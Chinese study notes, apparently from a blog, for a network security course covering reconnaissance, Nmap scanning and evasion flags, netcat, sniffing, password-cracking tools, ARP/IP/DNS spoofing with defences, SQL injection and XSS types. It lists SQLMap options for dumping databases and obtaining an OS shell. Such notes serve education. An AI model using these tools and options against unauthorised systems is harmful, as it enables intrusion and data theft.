<h2 id="2-黑客攻击与渗透测试"><a href="#2-黑客攻击与渗透测试" class="headerlink" title="2 黑客攻击与渗透测试"></a>2 黑客攻击与渗透测试</h2><h3 id="2-1-黑客攻击流程"><a href="#2-1-黑客攻击流程" class="headerlink" title="2.1 黑客攻击流程"></a>2.1 黑客攻击流程</h3><p><img src="https://img-blog.csdnimg.cn/20191112001521672.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70" alt="黑客攻击流程"></p>
<h3 id="2-2-踩点"><a href="#2-2-踩点" class="headerlink" title="2.2 踩点"></a>2.2 踩点</h3><h4 id="2-2-1-google-hacking"><a href="#2-2-1-google-hacking" class="headerlink" title="2.2.1 google hacking"></a>2.2.1 google hacking</h4><table>
<thead>
<tr>
<th>名称</th>
<th>功能</th>
</tr>
</thead>
<tbody><tr>
<td>“”</td>
<td>精确匹配；使用引号来搜索一个完全匹配的字词或一组字词</td>
</tr>
<tr>
<td>-</td>
<td>逻辑非，可排除所有包含该字词的搜索结果</td>
</tr>
<tr>
<td>+</td>
<td>必须包含该字词的搜索结果</td>
</tr>
<tr>
<td>~</td>
<td>可同时搜索该字词及其同义词</td>
</tr>
<tr>
<td>*</td>
<td>搜索词中不确定的部分可以用*代替，google或匹配相关词</td>
</tr>
<tr>
<td>OR</td>
<td>搜索结果匹配多个搜索字词中的任意一个</td>
</tr>
<tr>
<td>site</td>
<td>可以限定在某个特定网站中搜索信息；site:和站点名之间，不要带空格</td>
</tr>
<tr>
<td>inurl</td>
<td>限定在网站url链接中搜索网站信息；后面跟多个关键词时关键词之间是或的关系</td>
</tr>
<tr>
<td>allinurl</td>
<td>allinurl比url更严格，后面跟多个关键词是关键词之间是与的关系</td>
</tr>
<tr>
<td>intitle</td>
<td>限定在网页标题中搜索网站信息</td>
</tr>
<tr>
<td>allintitle</td>
<td>比intitle更严格，后面多个关键词是与的关系</td>
</tr>
<tr>
<td>related</td>
<td>可以搜索与指定网站有相似内容的网页</td>
</tr>
<tr>
<td>filetype</td>
<td>限定在文档格式中搜索网页信息</td>
</tr>
</tbody></table>
<h4 id="2-2-2-whois查询和DNS查询"><a href="#2-2-2-whois查询和DNS查询" class="headerlink" title="2.2.2 whois查询和DNS查询"></a>2.2.2 whois查询和DNS查询</h4><h4 id="2-2-3-网络侦查"><a href="#2-2-3-网络侦查" class="headerlink" title="2.2.3 网络侦查"></a>2.2.3 网络侦查</h4><ul>
<li>Unix&#x2F;Linux系统提供traceroute</li>
<li>Windows系统提供tracert</li>
</ul>
<p>可查询数据包的传输路径，如果部分节点没有返回数据信息，说明这些节点设备（可能是防火墙）阻塞了发送的数据包</p>
<h3 id="2-3-渗透测试"><a href="#2-3-渗透测试" class="headerlink" title="2.3 渗透测试"></a>2.3 渗透测试</h3><h4 id="2-3-1-渗透测试执行标准"><a href="#2-3-1-渗透测试执行标准" class="headerlink" title="2.3.1 渗透测试执行标准"></a>2.3.1 渗透测试执行标准</h4><ul>
<li>前期交互阶段</li>
<li>情报收集阶段</li>
<li>威胁建模阶段</li>
<li>漏洞分析阶段</li>
<li>渗透攻击阶段</li>
<li>后渗透攻击阶段</li>
<li>报告阶段</li>
</ul>
<h4 id="2-3-2-渗透测试框架（Metasploit-Framework，MSF）"><a href="#2-3-2-渗透测试框架（Metasploit-Framework，MSF）" class="headerlink" title="2.3.2 渗透测试框架（Metasploit Framework，MSF）"></a>2.3.2 渗透测试框架（Metasploit Framework，MSF）</h4><h2 id="3-网络扫描与查点技术"><a href="#3-网络扫描与查点技术" class="headerlink" title="3 网络扫描与查点技术"></a>3 网络扫描与查点技术</h2><h3 id="3-1-网络扫描技术是一种基于因特网的远程监测目标网络或本地主机安全性脆弱点的技术。"><a href="#3-1-网络扫描技术是一种基于因特网的远程监测目标网络或本地主机安全性脆弱点的技术。" class="headerlink" title="3.1 网络扫描技术是一种基于因特网的远程监测目标网络或本地主机安全性脆弱点的技术。"></a>3.1 网络扫描技术是一种基于因特网的远程监测目标网络或本地主机安全性脆弱点的技术。</h3><h3 id="3-2-端口扫描工具Nmap介绍"><a href="#3-2-端口扫描工具Nmap介绍" class="headerlink" title="3.2 端口扫描工具Nmap介绍"></a>3.2 端口扫描工具Nmap介绍</h3><h4 id="3-2-1-简介"><a href="#3-2-1-简介" class="headerlink" title="3.2.1 简介"></a>3.2.1 简介</h4><p>Nmap全称为Network Mapper，是一款开源的网络探测和扫描软件，可用来扫描计算机开放的网络连接、确定运行的服务以及探测操作系统类型等，它是网络管理员用来评估网络系统安全的必用软件之一。Nmap的核心功能有主机发现、端口扫描、版本侦测、操作系统侦测、防火墙&#x2F;入侵检测规避和NSE脚本引擎等。</p>
<h4 id="3-2-2-主机发现"><a href="#3-2-2-主机发现" class="headerlink" title="3.2.2 主机发现"></a>3.2.2 主机发现</h4><p>主要是发现目标系统是否处于存活状态。</p>
<h4 id="3-2-3-端口扫描"><a href="#3-2-3-端口扫描" class="headerlink" title="3.2.3 端口扫描"></a>3.2.3 端口扫描</h4><p>用于扫描主机上的端口状态。Nmap支持多种扫描技术，除了前面介绍过的TCP连接扫描、TCP SYN扫描、TCP FIN扫描、TCP ACK扫描、TCP窗口扫描、TCP Maimon扫描、UDP扫描外，还支持FTP代理扫描、认证扫描（Reverse-ident）等。</p>
<h4 id="3-2-4-版本侦测"><a href="#3-2-4-版本侦测" class="headerlink" title="3.2.4 版本侦测"></a>3.2.4 版本侦测</h4><p>用于识别端口上运行的应用程序与版本信息。</p>
<h4 id="3-2-5-操作系统侦测"><a href="#3-2-5-操作系统侦测" class="headerlink" title="3.2.5 操作系统侦测"></a>3.2.5 操作系统侦测</h4><p>用于识别目标系统的操作系统类型、版本信息及设备类型等。Nmap可以识别通用PC系统、交换机、路由器等上千种操作系统或设备。</p>
<h4 id="3-2-6-防火墙-x2F-入侵检测规避"><a href="#3-2-6-防火墙-x2F-入侵检测规避" class="headerlink" title="3.2.6 防火墙&#x2F;入侵检测规避"></a>3.2.6 防火墙&#x2F;入侵检测规避</h4><p>Nmap提供多种机制来规避防火墙、入侵检测的屏蔽和检测，以便于秘密的探测目标系统的信息，如分片、IP伪装、MAC伪装等。</p>
<h4 id="3-2-7-NSE脚本引擎"><a href="#3-2-7-NSE脚本引擎" class="headerlink" title="3.2.7 NSE脚本引擎"></a>3.2.7 NSE脚本引擎</h4><p>NSE除了可以用来增强前面的1到4项功能外，还可以扩展高级功能，比如Web扫描、漏洞发现、网络爬取、SQL注入攻击、数据库密码检测等。Nmap使用lua语言作为NSE脚本语言，目前已经支持数百个脚本，并能检测多种安全漏洞和系统缺陷。</p>
<h4 id="3-2-8-nmap端口状态解析"><a href="#3-2-8-nmap端口状态解析" class="headerlink" title="3.2.8 nmap端口状态解析"></a>3.2.8 nmap端口状态解析</h4><blockquote>
<p>open：应用程序在该端口接收 TCP 连接或者 UDP 报文。<br>closed：关闭的端口对于nmap也是可访问的， 它接收nmap探测报文并作出响应。但没有应用程序在其上监听。<br>filtered：由于包过滤阻止探测报文到达端口，nmap无法确定该端口是否开放。过滤可能来自专业的防火墙设备，路由规则 或者主机上的软件防火墙。<br>unfiltered：未被过滤状态意味着端口可访问，但是nmap无法确定它是开放还是关闭。 只有用于映射防火墙规则集的 ACK 扫描才会把端口分类到这个状态。<br>open | filtered：无法确定端口是开放还是被过滤， 开放的端口不响应就是一个例子。没有响应也可能意味着报文过滤器丢弃了探测报文或者它引发的任何反应。UDP，IP协议,FIN, Null 等扫描会引起。<br>closed | filtered：关闭或者被过滤的）：无法确定端口是关闭的还是被过滤的</p>
</blockquote>
<h4 id="3-2-9-常用参数介绍"><a href="#3-2-9-常用参数介绍" class="headerlink" title="3.2.9 常用参数介绍"></a>3.2.9 常用参数介绍</h4><table>
<thead>
<tr>
<th>参数</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>-sT</td>
<td>TCP连接扫描</td>
</tr>
<tr>
<td>-sS</td>
<td>TCP SYN扫描（须root权限）</td>
</tr>
<tr>
<td>-sF、-sN、-sX</td>
<td>TCP FIN扫描、TCP空扫描和TCP圣诞树扫描</td>
</tr>
<tr>
<td>-sU</td>
<td>UDP扫描（但扫描结果不可靠）</td>
</tr>
<tr>
<td>-sP</td>
<td>Ping扫描，Nmap在扫描端口时，默认使用ping扫描，只有主机存活，Nmap才会继续扫描</td>
</tr>
<tr>
<td>-sA</td>
<td>TCP ACK扫描，主要用来判断防火墙的规则集</td>
</tr>
<tr>
<td>-sR</td>
<td>RPC扫描</td>
</tr>
<tr>
<td>-sV</td>
<td>探测端口服务版本</td>
</tr>
<tr>
<td>-b</td>
<td>FTP代理扫描</td>
</tr>
<tr>
<td>-P0</td>
<td>扫描前不ping主机</td>
</tr>
<tr>
<td>-v</td>
<td>显示详细扫描过程</td>
</tr>
<tr>
<td>-p</td>
<td>指定扫描端口</td>
</tr>
<tr>
<td>-O</td>
<td>操作系统探测</td>
</tr>
<tr>
<td>-A</td>
<td>全面系统探测、启动脚本检测、扫描等</td>
</tr>
<tr>
<td>–script&#x3D;脚本名称</td>
<td>使用脚本引擎，可以进行漏洞扫描、漏洞利用、目录扫描等功能</td>
</tr>
</tbody></table>
<p>关于Nmap更加详细的讲解可以参见下面两篇博客</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/nmap/p/6232207.html">Nmap基础用法</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/nmap/p/6232969.html">Nmap高级用法</a></p>
<h3 id="3-3-查点技术"><a href="#3-3-查点技术" class="headerlink" title="3.3 查点技术"></a>3.3 查点技术</h3><p>踩点阶段攻击者已经识别出了存活的主机及其运行的服务，查点就是针对已知的弱点，对识别出来的主机或服务进行更深入的探测。</p>
<ul>
<li>Nessus</li>
<li>OpenVAS</li>
<li>Nexpose</li>
<li>netcat</li>
</ul>
<h4 id="3-3-1-nc（TCP-x2F-IP-瑞士军刀）"><a href="#3-3-1-nc（TCP-x2F-IP-瑞士军刀）" class="headerlink" title="3.3.1 nc（TCP&#x2F;IP 瑞士军刀）"></a>3.3.1 nc（TCP&#x2F;IP 瑞士军刀）</h4><p>语法：<br>nc [-hlnruz][-g&lt;网关…&gt;][-G&lt;指向器数目&gt;][-i&lt;延迟秒数&gt;][-o&lt;输出文件&gt;][-p&lt;通信端口&gt;][-s&lt;来源位址&gt;][-v…][-w&lt;超时秒数&gt;][主机名称][通信端口…]</p>
<p>参数：</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>-g&lt;网关&gt;</td>
<td>设置路由器跃程通信网关，最多可设置8个</td>
</tr>
<tr>
<td>-G&lt;指向器数目&gt;</td>
<td>设置来源路由指向器，其数值为4的倍数</td>
</tr>
<tr>
<td>-l</td>
<td>使用监听模式，管控传入的资料</td>
</tr>
<tr>
<td>-n</td>
<td>直接使用IP地址，而不通过域名服务器</td>
</tr>
<tr>
<td>-o&lt;输出文件&gt;</td>
<td>指定文件名称，把往来传输的数据以16进制字码倾倒成该文件保存</td>
</tr>
<tr>
<td>-p&lt;通信端口&gt;</td>
<td>设置本地主机使用的通信端口</td>
</tr>
<tr>
<td>-r</td>
<td>指定本地与远端主机的通信端口</td>
</tr>
<tr>
<td>-s&lt;来源位置&gt;</td>
<td>设置本地主机送出数据包的IP地址</td>
</tr>
<tr>
<td>-u</td>
<td>使用UDP传输协议</td>
</tr>
<tr>
<td>-v</td>
<td>显示指令执行过程</td>
</tr>
<tr>
<td>-w&lt;超时秒数&gt;</td>
<td>设置等待连线的时间</td>
</tr>
<tr>
<td>-z</td>
<td>使用0输入&#x2F;输出模式，只在扫描通信端口时使用</td>
</tr>
</tbody></table>
<h4 id="3-3-2-nslookup"><a href="#3-3-2-nslookup" class="headerlink" title="3.3.2 nslookup"></a>3.3.2 nslookup</h4><h2 id="4-网络嗅探技术"><a href="#4-网络嗅探技术" class="headerlink" title="4 网络嗅探技术"></a>4 网络嗅探技术</h2><h3 id="4-1-网络嗅探概述"><a href="#4-1-网络嗅探概述" class="headerlink" title="4.1 网络嗅探概述"></a>4.1 网络嗅探概述</h3><p>网络嗅探，也叫网络监听，是在网络总通过侦听的方式对通讯数据包进行监视、采集及分析的技术手段。<br>ARP（地址解析协议，Address Resolution Protocol），它负责将IP地址解析为MAC地址，完成网络地址到物理地址的映射。任何一台安装了TCP&#x2F;IP协议的主机中都有一张ARP缓存表，它记录着主机的IP地址和MAC地址的对应关系。</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>arp -a</td>
<td>查看缓存表</td>
</tr>
<tr>
<td>arp -s IP MAC</td>
<td>建立静态类型的记录</td>
</tr>
<tr>
<td>arp -d</td>
<td>删除ARP缓存记录或整个缓存表</td>
</tr>
</tbody></table>
<h3 id="4-2-交换式网络嗅探与共享式网络嗅探的区别"><a href="#4-2-交换式网络嗅探与共享式网络嗅探的区别" class="headerlink" title="4.2 交换式网络嗅探与共享式网络嗅探的区别"></a>4.2 交换式网络嗅探与共享式网络嗅探的区别</h3><p>目前，80％的局域网（LAN）是以太网，在局域网中大量地了集线器（HUB）或交换机（Switch）这种连接设备。利用集线器连接的局域网叫共享式局域网，利用交换机连接的局域网叫交换式局域网。那它们二者有何区别呢？大家知道，以太网中采用的工作方式是CSMA／CD（载波监听多点接入／碰撞检测），对于发送端来说，它每发送一个数据信息时，首先对网络进行监听，当它检测到线路正好有空，便立即发送数据，否则继续检测，直到线路空闲时再发送。对于接收端来说，对接收到的信号首先进行确认，如果是发给自己的就接收，否则不予理睬。在介绍集线器与交换机二者区别的时候，我们先来谈谈网络中的共享和交换这两个概念。在此，我们打个比方，同样是10个车道的马路，如果没有给道路标清行车路线，那么车辆就只能在无序的状态下抢道或占道通行，容易发生交通堵塞和反向行驶的车辆对撞，使通行能力降低。为了避免上述情况的发生，就需要在道路上标清行车线，保证每一辆车各行其道、互不干扰。共享式网络就相当于前面所讲的无序状态，当数据和用户数量超出一定的限量时，就会造成碰撞冲突，使网络性能衰退。而交换式网络则避免了共享式网络的不足，交换技术的作用便是根据所传递信息包的目的地址，将每一信息包独立地从端口送至目的端口,避免了与其它端口发生碰撞，提高了网络的实际吞吐量。共享式以太网存在的主要问题是所有用户共享带宽，每个用户的实际可用带宽随网络用户数的增加而递减。这是因为当信息繁忙时，多个用户都可能同进“争用”一个信道，而一个通道在某一时刻只充许一个用户占用，所以大量的经常处于监测等待状态，致使信号在传送时产生抖动、停滞或失真，严重影响了网络的性能。集线器上是一个中继器，而中继器的主要功能是对接收到的信号进行整形再生放大，使被衰减的信号再生（恢复）到发送时的状态，以扩大网络的传输距离，而不具备信号的定向传送能力。交换式以太网中，交换机供给每个用户专用的信息通道，除非两个源端口企图将信息同时发往同一目的端口，否则各个源端口与各自的目的端口之间可同时进行通信而不发生冲突。交换机只是在工作方式上与集线器不同，其它的连接方式、速度选择等则与集线器基本相同。不久的将来，局域网中的交换机将逐取代集线器。</p>
<h3 id="4-3-嗅探的实现"><a href="#4-3-嗅探的实现" class="headerlink" title="4.3 嗅探的实现"></a>4.3 嗅探的实现</h3><ul>
<li>基于Unix&#x2F;Linux系统的LibPcap</li>
<li>基于Windows系统的WinPcap</li>
</ul>
<h3 id="4-4-常见嗅探工具"><a href="#4-4-常见嗅探工具" class="headerlink" title="4.4 常见嗅探工具"></a>4.4 常见嗅探工具</h3><ol>
<li>Wireshark</li>
<li>Tcpdump</li>
</ol>
<h2 id="5-口令破解与防御"><a href="#5-口令破解与防御" class="headerlink" title="5 口令破解与防御"></a>5 口令破解与防御</h2><h3 id="5-1-常用口令破解技术"><a href="#5-1-常用口令破解技术" class="headerlink" title="5.1 常用口令破解技术"></a>5.1 常用口令破解技术</h3><ol>
<li>暴力破解</li>
<li>字典攻击</li>
<li>组合攻击</li>
<li>社会工程学攻击</li>
</ol>
<h3 id="5-2-操作系统口令破解"><a href="#5-2-操作系统口令破解" class="headerlink" title="5.2 操作系统口令破解"></a>5.2 操作系统口令破解</h3><h4 id="5-2-1-Windows系统口令破解"><a href="#5-2-1-Windows系统口令破解" class="headerlink" title="5.2.1 Windows系统口令破解"></a>5.2.1 Windows系统口令破解</h4><ol>
<li>Pwdump</li>
<li>L0phtcrack</li>
<li>Cain</li>
<li>Ophcrack</li>
</ol>
<h4 id="5-2-2-Linux系统口令破解"><a href="#5-2-2-Linux系统口令破解" class="headerlink" title="5.2.2 Linux系统口令破解"></a>5.2.2 Linux系统口令破解</h4><ol>
<li>John The Ripper</li>
<li>Johnny</li>
</ol>
<h2 id="6-欺骗攻击与防御"><a href="#6-欺骗攻击与防御" class="headerlink" title="6 欺骗攻击与防御"></a>6 欺骗攻击与防御</h2><h3 id="6-1-欺骗攻击概述"><a href="#6-1-欺骗攻击概述" class="headerlink" title="6.1 欺骗攻击概述"></a>6.1 欺骗攻击概述</h3><p>所谓欺骗，是通过更改或伪装的方式使受害者把攻击者当做其他的人或者事物，并以此获取各种信息的攻击手段，简单的说就是一种通过冒充合法用户身份通过认证以骗取信任的攻击方式。</p>
<h3 id="6-2-ARP欺骗"><a href="#6-2-ARP欺骗" class="headerlink" title="6.2 ARP欺骗"></a>6.2 ARP欺骗</h3><h4 id="6-2-1-ARP欺骗属于中间人攻击，工具如下"><a href="#6-2-1-ARP欺骗属于中间人攻击，工具如下" class="headerlink" title="6.2.1 ARP欺骗属于中间人攻击，工具如下"></a>6.2.1 ARP欺骗属于中间人攻击，工具如下</h4><ul>
<li>Windows下的工具（Cain、NetFuke、Arp cheat and sniffer）</li>
<li>Linux下的工具（Ettercap）</li>
</ul>
<h4 id="6-2-2-ARP欺骗防御"><a href="#6-2-2-ARP欺骗防御" class="headerlink" title="6.2.2 ARP欺骗防御"></a>6.2.2 ARP欺骗防御</h4><ul>
<li>静态绑定</li>
<li>使用ARP防火墙</li>
</ul>
<h3 id="6-3-IP欺骗"><a href="#6-3-IP欺骗" class="headerlink" title="6.3 IP欺骗"></a>6.3 IP欺骗</h3><h3 id="6-4-TCP会话劫持"><a href="#6-4-TCP会话劫持" class="headerlink" title="6.4 TCP会话劫持"></a>6.4 TCP会话劫持</h3><h3 id="6-4-1-TCP会话劫持工具"><a href="#6-4-1-TCP会话劫持工具" class="headerlink" title="6.4.1 TCP会话劫持工具"></a>6.4.1 TCP会话劫持工具</h3><ul>
<li>Juggernaut</li>
<li>TTYWatcher</li>
<li>Dsniff</li>
<li>Hunt</li>
</ul>
<h3 id="6-4-2-IP欺骗的防御"><a href="#6-4-2-IP欺骗的防御" class="headerlink" title="6.4.2 IP欺骗的防御"></a>6.4.2 IP欺骗的防御</h3><ol>
<li>抛弃基于地址的信任策略</li>
<li>进行包过滤</li>
<li>使用加密方法</li>
<li>使用随机化的初始序列号</li>
</ol>
<h3 id="6-5-DNS欺骗"><a href="#6-5-DNS欺骗" class="headerlink" title="6.5 DNS欺骗"></a>6.5 DNS欺骗</h3><h4 id="6-5-1-定义"><a href="#6-5-1-定义" class="headerlink" title="6.5.1 定义"></a>6.5.1 定义</h4><p>DNS欺骗，又称DNS域名重定向或域名劫持，是通过拦截域名解析请求或篡改域名服务器上的数据，使得用户在访问相关域名时返回虚假IP地址或使用户的请求失败的攻击方式。</p>
<h4 id="6-5-2-DNS欺骗的实现"><a href="#6-5-2-DNS欺骗的实现" class="headerlink" title="6.5.2 DNS欺骗的实现"></a>6.5.2 DNS欺骗的实现</h4><p>工具</p>
<ul>
<li>Ettercap</li>
</ul>
<h4 id="6-5-3-DNS欺骗的防御"><a href="#6-5-3-DNS欺骗的防御" class="headerlink" title="6.5.3 DNS欺骗的防御"></a>6.5.3 DNS欺骗的防御</h4><ol>
<li>使用最新版本的DNS服务器软件并安装最新补丁</li>
<li>限制DNS动态更新</li>
<li>限制区域传送</li>
<li>关闭DNS服务器的递归查询功能</li>
</ol>
<h3 id="6-6-电子邮件欺骗"><a href="#6-6-电子邮件欺骗" class="headerlink" title="6.6 电子邮件欺骗"></a>6.6 电子邮件欺骗</h3><h3 id="6-7-Web欺骗"><a href="#6-7-Web欺骗" class="headerlink" title="6.7 Web欺骗"></a>6.7 Web欺骗</h3><h2 id="7-Web攻击与防御"><a href="#7-Web攻击与防御" class="headerlink" title="7 Web攻击与防御"></a>7 Web攻击与防御</h2><h3 id="7-1-Web安全概述"><a href="#7-1-Web安全概述" class="headerlink" title="7.1 Web安全概述"></a>7.1 Web安全概述</h3><p><img src="https://img-blog.csdnimg.cn/20191127185838746.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70" alt="OWASP Top 10"></p>
<h3 id="7-2-同源策略"><a href="#7-2-同源策略" class="headerlink" title="7.2 同源策略"></a>7.2 同源策略</h3><p>同源策略规定不同域的客户端脚本在没有明确授权的情况下，不能读写对方的资源。<br>同域策略是指两个站点具有相同的协议、域名和端口。</p>
<h3 id="7-3-SQL注入攻击（SQL-Injection）"><a href="#7-3-SQL注入攻击（SQL-Injection）" class="headerlink" title="7.3 SQL注入攻击（SQL Injection）"></a>7.3 SQL注入攻击（SQL Injection）</h3><h4 id="7-3-1-SQL注入分类："><a href="#7-3-1-SQL注入分类：" class="headerlink" title="7.3.1 SQL注入分类："></a>7.3.1 SQL注入分类：</h4><table>
<thead>
<tr>
<th>分类标准</th>
<th>包含类别</th>
</tr>
</thead>
<tbody><tr>
<td>注入点数据类型</td>
<td>数字型注入、字符型注入</td>
</tr>
<tr>
<td>注入点位置</td>
<td>GET注入、POST注入、Cookie注入、HTTP头注入、搜索注入</td>
</tr>
<tr>
<td>注入方法</td>
<td>布尔型注入、报错型注入、延时注入、联合查询注入、多语句查询注入</td>
</tr>
</tbody></table>
<h4 id="7-3-2-SQL注入工具SQLMap"><a href="#7-3-2-SQL注入工具SQLMap" class="headerlink" title="7.3.2 SQL注入工具SQLMap"></a>7.3.2 SQL注入工具SQLMap</h4><table>
<thead>
<tr>
<th>命令行参数</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>-u</td>
<td>指定测试的URL地址（加单引号）</td>
</tr>
<tr>
<td>- -cookie</td>
<td>指定cookie的值（加单引号）</td>
</tr>
<tr>
<td>- -dbs</td>
<td>获取数据库信息</td>
</tr>
<tr>
<td>- -current-db</td>
<td>获取当前应用程序连接的数据库</td>
</tr>
<tr>
<td>-D</td>
<td>指定数据库</td>
</tr>
<tr>
<td>- -tables</td>
<td>获取数据库表的信息，一般结合-D参数获取指定数据库的表</td>
</tr>
<tr>
<td>-T</td>
<td>指定数据库表</td>
</tr>
<tr>
<td>- -columns</td>
<td>获取表字段的信息，一般结合-T参数获取指定表的字段名</td>
</tr>
<tr>
<td>-C</td>
<td>指定数据库表的列</td>
</tr>
<tr>
<td>-dump</td>
<td>转存数据库数据，可结合-D、-T、-C参数获取指定指定数据</td>
</tr>
<tr>
<td>-privileges</td>
<td>测试用户权限，–privileges -U -sa测试sa用户权限</td>
</tr>
<tr>
<td>- -os-cmd&#x3D;”net user”</td>
<td>执行net user命令</td>
</tr>
<tr>
<td>- -os-shell</td>
<td>获取系统交互shell</td>
</tr>
</tbody></table>
<p><img src="https://img-blog.csdnimg.cn/20191101120555209.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70" alt="sqlmap帮助1"></p>
<p><img src="https://img-blog.csdnimg.cn/20191101120641970.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70" alt="sqlmap帮助2"></p>
<h4 id="7-3-3-SQL注入的防御"><a href="#7-3-3-SQL注入的防御" class="headerlink" title="7.3.3 SQL注入的防御"></a>7.3.3 SQL注入的防御</h4><ul>
<li>对输入数据进行校验</li>
<li>对输入数据进行编</li>
<li>使用预编译语句</li>
<li>配置安全的数据库管理系统</li>
</ul>
<h3 id="7-4-XSS攻击（Cross-Site-Scripting）"><a href="#7-4-XSS攻击（Cross-Site-Scripting）" class="headerlink" title="7.4 XSS攻击（Cross-Site Scripting）"></a>7.4 XSS攻击（Cross-Site Scripting）</h3><h4 id="7-4-1-跨站脚本攻击原理"><a href="#7-4-1-跨站脚本攻击原理" class="headerlink" title="7.4.1 跨站脚本攻击原理"></a>7.4.1 跨站脚本攻击原理</h4><p>跨站脚本攻击是指攻击者利用Web服务器中的应用程序或代码的漏洞，在网页中嵌入客户端脚本（通常是一段由JavaScript编写的恶意代码，较少情况下会有使用ActionScript、VBScript等脚本语言编写的恶意代码），当信任此Web服务器的用户访问Web站点中含有恶意脚本代码的页面或者打开收到的URL链接时，该用户的浏览器就会自动加载并执行该恶意代码，从而达到攻击目的。</p>
<h4 id="7-4-2-反射型XSS"><a href="#7-4-2-反射型XSS" class="headerlink" title="7.4.2 反射型XSS"></a>7.4.2 反射型XSS</h4><p>反射型XSS也被称为非持久性XSS，是最常见的一种XSS。XSS代码出现在URL请求中，当用户访问带有XSS代码的URL请求时，服务器端接收请求并处理，然后将带有XSS代码的数据返回给浏览器，浏览器解析该段带有XSS代码的数据并执行，整个过程就像一次反射，故称为反射型XSS。</p>
<p><img src="https://img-blog.csdnimg.cn/20191210193738407.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70" alt="反射型XSS"></p>
<h4 id="7-4-3-存储型XSS"><a href="#7-4-3-存储型XSS" class="headerlink" title="7.4.3 存储型XSS"></a>7.4.3 存储型XSS</h4><p>存储型XSS又被称为持久性XSS。在存储型XSS中，XSS代码被存储到服务器端，因此允许用户存储数据到服务器端的Web应用程序都可能存在该类型XSS漏洞。攻击者提交一段XSS代码后，服务器接收并存储，当其他用户访问包含该XSS代码的页面时，XSS代码被浏览器解析并执行。</p>
<p><img src="https://img-blog.csdnimg.cn/20191210193824668.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70" alt="存储型XSS"></p>
<h4 id="7-4-4-DOM型XSS"><a href="#7-4-4-DOM型XSS" class="headerlink" title="7.4.4 DOM型XSS"></a>7.4.4 DOM型XSS</h4><p>DOM（Document Object Model）指文档对象模型。DOM常用来表示在HTML和XML中的对象。DOM可以允许程序动态的访问和更新文档的内容、结构等。也就是说，我们通过JavaScript代码控制DOM节点，就可以不经过服务器端的参与重构HTML页面。<br>因此，DOM XSS与前面两种XSS的区别就在于该种类型的XSS攻击的代码不需要与服务器端进行交互，触发XSS是基于浏览器对DOM数据的解析来完成的，也就完全是客户端的事情。</p>
<p><img src="https://img-blog.csdnimg.cn/20191210193850411.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70" alt="DOM型XSS"></p>
<h3 id="7-5-CSRF攻击（Cross-Site-Request-Forgery）"><a href="#7-5-CSRF攻击（Cross-Site-Request-Forgery）" class="headerlink" title="7.5 CSRF攻击（Cross-Site Request Forgery）"></a>7.5 CSRF攻击（Cross-Site Request Forgery）</h3><p>跨站请求伪造</p>
<h3 id="7-6-SSRF攻击（Server-Side-Request-Forgery，SSRF）"><a href="#7-6-SSRF攻击（Server-Side-Request-Forgery，SSRF）" class="headerlink" title="7.6 SSRF攻击（Server-Side Request Forgery，SSRF）"></a>7.6 SSRF攻击（Server-Side Request Forgery，SSRF）</h3><p>服务端请求伪造</p>
<h3 id="7-7-文件上传漏洞"><a href="#7-7-文件上传漏洞" class="headerlink" title="7.7 文件上传漏洞"></a>7.7 文件上传漏洞</h3><h3 id="7-8-命令执行漏洞"><a href="#7-8-命令执行漏洞" class="headerlink" title="7.8 命令执行漏洞"></a>7.8 命令执行漏洞</h3><h3 id="7-9-XXE漏洞（XML-External-Entity-injection）"><a href="#7-9-XXE漏洞（XML-External-Entity-injection）" class="headerlink" title="7.9 XXE漏洞（XML External Entity injection）"></a>7.9 XXE漏洞（XML External Entity injection）</h3><p>XML外部实体注入漏洞</p>
<h2 id="8-缓冲区溢出攻击与防御"><a href="#8-缓冲区溢出攻击与防御" class="headerlink" title="8 缓冲区溢出攻击与防御"></a>8 缓冲区溢出攻击与防御</h2><h3 id="8-1-一个可执行文件根据文件格式被分成若干个数据节，不同的资源被放在不同的节中，各个数据节存放的数据类型大致如下："><a href="#8-1-一个可执行文件根据文件格式被分成若干个数据节，不同的资源被放在不同的节中，各个数据节存放的数据类型大致如下：" class="headerlink" title="8.1 一个可执行文件根据文件格式被分成若干个数据节，不同的资源被放在不同的节中，各个数据节存放的数据类型大致如下："></a>8.1 一个可执行文件根据文件格式被分成若干个数据节，不同的资源被放在不同的节中，各个数据节存放的数据类型大致如下：</h3><ul>
<li>代码段（.text）：也称文本段，由编译器产生，存放程序的二进制机器代码和只读数据，比如程序的可执行指令；</li>
<li>已初始化的数据段（.data）：存放全局和静态的已初始化变量；</li>
<li>未初始化的数据段（.bss）：存放全局和静态的未初始化变量；</li>
<li>堆（heap）：用来存储程序执行时的变量；</li>
<li>栈（stack）：用来存储函数调用时的临时信息的数据结构。</li>
</ul>
